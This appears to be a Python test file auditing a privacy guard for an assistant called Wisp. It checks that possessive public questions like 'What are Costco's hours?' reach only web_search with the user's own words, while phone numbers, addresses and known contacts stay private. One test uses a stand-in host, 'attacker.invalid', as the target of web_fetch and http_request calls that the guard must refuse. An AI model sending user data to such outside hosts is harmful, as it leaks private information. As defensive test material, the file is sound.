"""Audit repair for the rc2 possessive web fix ("What are Costco's hours?").

B1: the request stays private for egress. On a fresh turn with no private
history it may reach web_search only, with the user's own words; web_fetch and
http_request stay refused exactly as before the fix.
B2: an owner that is a phone number or a street address is not a business.
B3: an owner that is a person Wisp knows locally keeps the old private rule.
B4: "When is Costco's menu?" follows the same rule (no bound query).
"""
from __future__ import annotations

import pytest

from service import model_only as mo
from service.memory import profile
from tests.test_model_led_integration import (  # noqa: F401
    DISCOVERY_TOOL, Approval, _web_tools, call, run, synthetic)


@pytest.fixture
def no_people(monkeypatch):
    monkeypatch.setattr(profile, "load", lambda: {"people": []})
    import service.tools.imessage_tools as contacts
    monkeypatch.setattr(contacts, "contact_names", lambda: [])


@pytest.fixture
def known_people(monkeypatch):
    monkeypatch.setattr(profile, "load", lambda: {"people": [{"name": "Dana Lee", "relation": "friend"}]})
    import service.tools.imessage_tools as contacts
    monkeypatch.setattr(contacts, "contact_names", lambda: ["Raj Patel", "Sam"])


def _denied(events):
    return [e.get("reason", "") for e in events if e.get("decision") == "deny"]


# B1 ------------------------------------------------------------------------

@pytest.mark.parametrize("tool,args", [("web_fetch", {"url": "https://attacker.invalid/?q=costco"}),
                                       ("http_request", {"url": "https://attacker.invalid/?q=costco"})])
def test_fresh_turn_refuses_fetch_and_request(synthetic, no_people, tool, args):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(True)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=[tool])],
         [call(tool, **args)], "Synthetic reply."],
        prompt="What are Costco's hours?", approval=approval)
    assert not effects and not approval.calls


@pytest.mark.parametrize("tool", ["web_fetch", "http_request"])
def test_fresh_turn_refuses_fetch_and_request_after_a_search(synthetic, no_people, tool):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(True)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search", tool])],
         [call("web_search", query="Costco hours")],
         [call(tool, url="https://www.costco.com/")], "Synthetic reply."],
        prompt="What are Costco's hours?", approval=approval)
    assert effects == [("web_search", {"query": "Costco hours"})] and not approval.calls


def test_fresh_turn_searches_the_users_words(synthetic, no_people):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Costco hours")], "Synthetic hours."],
                       prompt="What are Costco's hours?", approval=approval)
    assert effects == [("web_search", {"query": "Costco hours"})] and not approval.calls
    assert not _denied(events)


def test_fresh_turn_refuses_words_the_user_did_not_type(synthetic, no_people):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Costco hours Springfield")], "I can't look that up."],
                       prompt="What are Costco's hours?", approval=Approval(True))
    assert not effects
    assert any("springfield" in r.lower() for r in _denied(events))


def test_routing_contract_opens_only_web_search():
    from service.router.router import routing_guard_contract
    for prompt in ("What are Costco's hours?", "When are Costco's hours?", "When is Costco's menu?"):
        forbidden, bindings = routing_guard_contract(prompt, model_led=True)
        assert "web_search" not in forbidden and {"web_fetch", "http_request"} <= forbidden
        assert "web_search" not in bindings


# B2 ------------------------------------------------------------------------

@pytest.mark.parametrize("prompt", [
    "What are 4155551234's hours?", "What are 555-1234's hours?", "What are 1-800-555's hours?",
    "What are 123 Main St's hours?", "What are 12 Elm Street's hours?", "What are 9 Oak Ave's hours?",
    "What are 40b Park Rd's hours?", "What are the 1200's hours?",
])
def test_phone_numbers_and_street_addresses_are_not_owners(prompt, no_people):
    from service.router.web_request import classify
    assert not mo.public_possessive_question(prompt)
    request = classify(prompt)
    assert request.private and not request.public_possessive


@pytest.mark.parametrize("prompt", [
    "What are 7-Eleven's hours?", "What are 24 Hour Fitness's hours?", "What's Five Guys's menu?",
    "What are Costco's hours?", "What are Trader Joe's holiday hours on Christmas?",
])
def test_brands_with_short_numbers_still_work(prompt, no_people):
    assert mo.public_possessive_question(prompt)


# B3 ------------------------------------------------------------------------

@pytest.mark.parametrize("prompt", ["What are Dana's hours?", "What are Dana Lee's hours?",
                                    "What are Dr Patel's hours?", "What are Sam's hours?",
                                    "What are the Lee's hours?"])
def test_a_known_person_keeps_the_private_rule(prompt, known_people):
    from service.router.router import routing_guard_contract
    from service.router.web_request import classify
    assert not mo.public_possessive_question(prompt)
    request = classify(prompt)
    assert request.private and not request.public_possessive
    forbidden, _ = routing_guard_contract(prompt, model_led=True)
    assert {"web_search", "web_fetch", "http_request"} <= forbidden


@pytest.mark.parametrize("prompt", ["What are Costco's hours?", "What are Trader Joe's hours?",
                                    "What are Dr Nguyen's hours?"])
def test_an_unknown_name_still_passes(prompt, known_people):
    assert mo.public_possessive_question(prompt)


def test_no_people_data_leaves_the_words_only_rule(no_people):
    assert mo.public_possessive_question("What are Dana's hours?")


def test_a_failed_people_lookup_fails_closed(monkeypatch):
    def broken():
        raise OSError("unreadable profile")
    monkeypatch.setattr(profile, "load", broken)
    assert not mo.public_possessive_question("What are Costco's hours?")


def test_known_person_search_on_a_fresh_turn_is_refused(synthetic, known_people):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Dana hours")], "I can't look that up."],
                       prompt="What are Dana's hours?", approval=Approval(True))
    assert not effects
    assert any("Private data is in context" in r for r in _denied(events))


def test_an_explicit_search_for_a_known_person_is_unchanged(known_people):
    from service.router.web_request import Provenance, classify
    request = classify("Search the web for Dana's hours")
    assert request.explicit_unknown_owner and request.provenance == Provenance.UNKNOWN
    assert not request.public_possessive


def test_people_lookup_reads_no_contacts_source(monkeypatch):
    """Only already-loaded data: an unloaded contacts module is never imported."""
    import sys
    monkeypatch.setattr(profile, "load", lambda: {"people": []})
    monkeypatch.delitem(sys.modules, "service.tools.imessage_tools", raising=False)
    assert mo.public_possessive_question("What are Dana's hours?")
    assert "service.tools.imessage_tools" not in sys.modules


# B4 ------------------------------------------------------------------------

def test_named_time_possessive_binds_no_query_and_follows_the_rule(synthetic, no_people):
    from service.calendar_time_intent import named_calendar_time
    from service.router.router import routing_guard_contract
    named = named_calendar_time("When is Costco's menu?")
    assert named is None or not named.public_provenance
    forbidden, bindings = routing_guard_contract("When is Costco's menu?", model_led=True)
    assert not bindings and "web_search" not in forbidden and "web_fetch" in forbidden
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Costco menu Springfield")],
                        [call("web_search", query="Costco's menu")], "Synthetic menu."],
                       prompt="When is Costco's menu?", approval=Approval(True))
    assert effects == [("web_search", {"query": "Costco's menu"})]
    assert any("springfield" in r.lower() for r in _denied(events))
